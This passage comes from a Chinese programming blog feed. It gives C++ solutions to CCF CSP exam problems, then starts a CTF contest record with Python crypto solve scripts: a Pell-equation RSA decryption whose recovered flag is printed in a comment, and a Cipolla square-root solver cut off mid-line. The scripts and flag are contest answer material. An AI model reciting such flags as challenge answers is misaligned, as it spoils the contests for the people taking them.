class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; p;<br>        <span class="hljs-keyword">for</span>(count = <span class="hljs-number">1</span>; count &lt; <span class="hljs-number">21</span>; count++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(sit[count]&gt;=p)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= p; j++)<br>                &#123;<br>                    cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                &#125;<br>                sit[count]-=p;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">21</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(count = <span class="hljs-number">1</span>; count &lt; <span class="hljs-number">21</span> &amp;&amp; p &gt;=<span class="hljs-number">0</span>; count++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(sit[count])<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(sit[count]&lt;=p)<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= sit[count]; j++)<br>                    &#123;<br>                        cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= p; j++)<br>                        &#123;<br>                            cout &lt;&lt; (count<span class="hljs-number">-1</span>)*<span class="hljs-number">5</span>+(<span class="hljs-number">5</span>-sit[count])+j &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-type">int</span> num = p;<br>                p-=sit[count];<br>                sit[count]-=num;<br>            &#125;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201604-2-俄罗斯方块">201604-2 俄罗斯方块</h2><p>这个题目也是很需要思路的，暴力肯定写不出来，我的想法就是找到这个方块的左下角定位，随后每次让其对于整体而言下降1，并且逐个遍历方块与背景，如果有冲突的地方那么说明上一个位置就是答案，思路理清之后开写：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> bb=<span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> lowx=<span class="hljs-number">0</span>,lowy;<br>    <span class="hljs-type">int</span> square[<span class="hljs-number">20</span>][<span class="hljs-number">10</span>];<br>    <span class="hljs-type">int</span> n[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memset</span>(square, <span class="hljs-number">1</span>, <span class="hljs-built_in">sizeof</span>(square));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            cin&gt;&gt;square[i][j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            cin&gt;&gt;n[i][j];<br>        &#125;<br>    &#125;<br>    cin &gt;&gt; x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = <span class="hljs-number">0</span>; ; y++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;<span class="hljs-number">4</span>; k++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(n[i][k]&amp;&amp;square[i+y][k+x<span class="hljs-number">-1</span>])<br>                &#123;<br>                    bb=<span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(bb) <span class="hljs-keyword">break</span>; <br>        &#125;<br>        <span class="hljs-keyword">if</span> (bb) <br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;<span class="hljs-number">4</span>; k++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(n[i][k])<br>                    square[i+y<span class="hljs-number">-1</span>][k+x<span class="hljs-number">-1</span>]=n[i][k];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            cout &lt;&lt; square[i][j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2014年">2014年</h1><h2 id="201412-2-Z字型扫描">201412-2 Z字型扫描</h2><p>这道题的思路主要在于向上扫描和向下扫描的切换，如果碰到上边界就得往右边走，如果碰到的是右边界就要往下面走，依次类推，走完之后转变方向。如果是向上走就每次x-1和y+1，向下走就是x+1而y-1，得到规律之后就很好写了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">501</span>][<span class="hljs-number">501</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        &#123;<br>            cin &gt;&gt; arr[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">1</span>,y=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">bool</span> w = <span class="hljs-literal">false</span>;<span class="hljs-comment">//转弯</span><br>    <span class="hljs-type">bool</span> up=<span class="hljs-literal">true</span>;<span class="hljs-comment">//方向</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,arr[x][y]);<br>    <span class="hljs-keyword">while</span>(x!=n||y!=n)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(up)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">1</span>&amp;&amp;y<span class="hljs-number">+1</span>&lt;=n)<span class="hljs-comment">//没碰到边界</span><br>            &#123;<br>                x--;<br>                y++;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(y&lt;n&amp;&amp;x==<span class="hljs-number">1</span>)<span class="hljs-comment">//碰到上边界未转弯</span><br>            &#123;<br>                y++;<br>                up=<span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(y==n)<span class="hljs-comment">//右边界</span><br>            &#123;<br>                x++;<br>                up=<span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(y<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">1</span>&amp;&amp;x<span class="hljs-number">+1</span>&lt;=n)<span class="hljs-comment">//没碰到边界</span><br>            &#123;<br>                y--;<br>                x++;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x&lt;n&amp;&amp;y==<span class="hljs-number">1</span>)<span class="hljs-comment">//碰到左边界</span><br>            &#123;<br>                x++;<br>                up=<span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x==n)<span class="hljs-comment">//下边界</span><br>            &#123;<br>                y++;<br>                up=<span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d&quot;</span>,arr[x][y]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201403-2-窗口">201403-2 窗口</h2><p>这道题目的思路也不难，就是每次输入的时候从最高层进行判断落在哪个区域，随后便将该区域置为最上层，也就是优先级最高，其他比其高的窗口全部向后挪一位即可，可以使用一个数组保存第i个等级为哪个窗口，这样就可以每次都从最高等级窗口开始遍历。</p><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m,windows[<span class="hljs-number">11</span>][<span class="hljs-number">4</span>],pri[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">bool</span> yes;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        pri[i]=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            cin &gt;&gt; windows[i][j];<br>        &#125;<br>        pri[i]=i;<br>    &#125;<br>    <span class="hljs-type">int</span> x,y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)<br>    &#123;<br>        cin &gt;&gt; x &gt;&gt; y;<br>        yes = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = n<span class="hljs-number">-1</span>; j &gt;= <span class="hljs-number">0</span>; j--)<span class="hljs-comment">//从最高级开始遍历 pri[]数组代表第j个等级是哪个窗口</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(x&gt;=windows[pri[j]][<span class="hljs-number">0</span>]&amp;&amp;x&lt;windows[pri[j]][<span class="hljs-number">2</span>]&amp;&amp;y&gt;=windows[pri[j]][<span class="hljs-number">1</span>]&amp;&amp;y&lt;windows[pri[j]][<span class="hljs-number">3</span>])<br>            &#123;<br>                <span class="hljs-type">int</span> tmp = pri[j];<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k =j<span class="hljs-number">+1</span>; k &lt; n; k++)<br>                &#123;<br>                    pri[k<span class="hljs-number">-1</span>]=pri[k];<br>                &#125;<br>                pri[n<span class="hljs-number">-1</span>]=tmp;<br>                yes=<span class="hljs-literal">true</span>;<br>                cout &lt;&lt; pri[n<span class="hljs-number">-1</span>]<span class="hljs-number">+1</span> &lt;&lt; endl;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(x&gt;windows[pri[j]][<span class="hljs-number">0</span>]&amp;&amp;y&gt;windows[pri[j]][<span class="hljs-number">1</span>]&amp;&amp;x&lt;=windows[pri[j]][<span class="hljs-number">2</span>]&amp;&amp;y&lt;=windows[pri[j]][<span class="hljs-number">3</span>])<br>            &#123;<br>                <span class="hljs-type">int</span> tmp = pri[j];<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k =j<span class="hljs-number">+1</span>; k &lt; n; k++)<br>                &#123;<br>                    pri[k<span class="hljs-number">-1</span>]=pri[k];<br>                &#125;<br>                yes=<span class="hljs-literal">true</span>;<br>                pri[n<span class="hljs-number">-1</span>]=tmp;<br>                cout &lt;&lt; pri[n<span class="hljs-number">-1</span>]<span class="hljs-number">+1</span> &lt;&lt; endl;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!yes)<br>        cout &lt;&lt; <span class="hljs-string">&quot;IGNORED&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ccf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>比赛记录</title>
    <link href="/2023/12/11/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/12/11/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>记录一下以前的一些比赛，这里感谢striving大佬，好多都是问的他哈哈哈哈。</p><span id="more"></span><h1 id="杭师大">杭师大</h1><h2 id="一步到喂">一步到喂</h2><p>佩尔方程求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pell</span>(<span class="hljs-params">N</span>):<br>    cf = continued_fraction(sqrt(N))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        denom = cf.denominator(i)<br>        numer = cf.numerator(i)<br>        <span class="hljs-keyword">if</span> numer*numer - N * denom*denom == <span class="hljs-number">1</span> :<br>            <span class="hljs-keyword">return</span> numer, denom<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>d=<span class="hljs-number">105279230912868770223946474836383391725923</span><br>a=<span class="hljs-number">1293023064232431070902426583269468463</span><br>x,y=solve_pell(d//a)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-keyword">assert</span> <span class="hljs-number">1293023064232431070902426583269468463</span>*<span class="hljs-built_in">pow</span>(x,<span class="hljs-number">2</span>)==<span class="hljs-number">105279230912868770223946474836383391725923</span>*<span class="hljs-built_in">pow</span>(y,<span class="hljs-number">2</span>)+<span class="hljs-number">1293023064232431070902426583269468463</span><br>p=<span class="hljs-number">9850212100620338486478343799784951721581757936621772924971218807300819701941457605399099898870264241518769370682330612103782092302148525012450902351701339</span><br>q=<span class="hljs-number">10749429992014823019923966246896511618886613763258781706004694804949547801668777655988055847885755337127548775758133804022361510427909703124161450470578543</span><br>c=<span class="hljs-number">66847321508502017574023222490247591875197038421108556106531660421662626233521063441647157067220450229816184622038471812597874582613385516838920632450015292570673816423432903604941781889308906893966588610214614726388822851471695742453496232748358301888465563812947038856742838097152549971517159475947566599664</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=invert(x,phi)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(c,d,p*q))<br><span class="hljs-comment">#HZNUCTF&#123;D0_y0u_know_p3ll_3qu4tion!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="checkin">checkin</h2><p>连续24000次开方</p><p>quadratic_residue和cipolla</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">square_root_of_quadratic_residue</span>(<span class="hljs-params">n, modulo</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Square root of quadratic residue</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Solve the square root of quadratic residue using Cipolla&#x27;s algorithm with Legendre symbol</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int -- if n is a quadratic residue,</span><br><span class="hljs-string">                   return x, such that x^&#123;2&#125; = n (mod modulo)</span><br><span class="hljs-string">               otherwise, return -1</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> modulo == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n % modulo == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    Legendre = <span class="hljs-keyword">lambda</span> n: <span class="hljs-built_in">pow</span>(n, modulo - <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>, modulo)<br>    <span class="hljs-keyword">if</span> Legendre(n) == modulo - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> Legendre(t ** <span class="hljs-number">2</span> - n) != modulo - <span class="hljs-number">1</span>:<br>        t += <span class="hljs-number">1</span><br>    w = (t ** <span class="hljs-number">2</span> - n) % modulo<br>    <span class="hljs-keyword">return</span> (generate_quadratic_field(w, modulo)(t, <span class="hljs-number">1</span>) ** (modulo + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>)).x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_quadratic_field</span>(<span class="hljs-params">d, modulo=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Generate quadratic field number class</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        class -- quadratic field number class</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(modulo, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> modulo &gt;= <span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuadraticFieldNumber</span>:<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x, y</span>):<br>            <span class="hljs-variable language_">self</span>.x = x % modulo<br>            <span class="hljs-variable language_">self</span>.y = y % modulo<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, another</span>):<br>            x = <span class="hljs-variable language_">self</span>.x * another.x + d * <span class="hljs-variable language_">self</span>.y * another.y<br>            y = <span class="hljs-variable language_">self</span>.x * another.y + <span class="hljs-variable language_">self</span>.y * another.x<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.__class__(x, y)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pow__</span>(<span class="hljs-params">self, exponent</span>):<br>            result = <span class="hljs-variable language_">self</span>.__class__(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> exponent:<br>                temporary = <span class="hljs-variable language_">self</span>.__class__(<span class="hljs-variable language_">self</span>.x, <span class="hljs-variable language_">self</span>.y)<br>                <span class="hljs-keyword">while</span> exponent:<br>                    <span class="hljs-keyword">if</span> exponent &amp; <span class="hljs-number">1</span>:<br>                        result *= temporary<br>                    temporary *= temporary<br>                    exponent &gt;&gt;= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> result<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;(&#123;&#125;, &#123;&#125; \\sqrt(&#123;&#125;))&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.x, <span class="hljs-variable language_">self</span>.y, d)<br><br>    <span class="hljs-keyword">return</span> QuadraticFieldNumber<br><br>n = <span class="hljs-number">22114546923564420607945063747927422619774890007937503484905798897563036431278699718161460968350749338680452479484253816646632515078192048118109272532310403715802657061990320170724360874028667484527150185159662403573637809180151665727445208585725264186578429094937215068881079399747998551453944363665401263</span><br>c = <span class="hljs-number">7274219309267176700435453490636404568410293850833252412471984274955007037941820465929958008672185817002749418809077052781794306899476543760452010370102811167685901654480233874375880047900499814304539829706786470978714629827690730256369200773772396109793338097451559255985268375731804819829315168807228186</span><br>h = <span class="hljs-number">1463929459818798711929811606552273520156490689917243949474579232718301828387871678397965433435537694532920957475947201372279363554005600100100224291888130</span><br>hint = <span 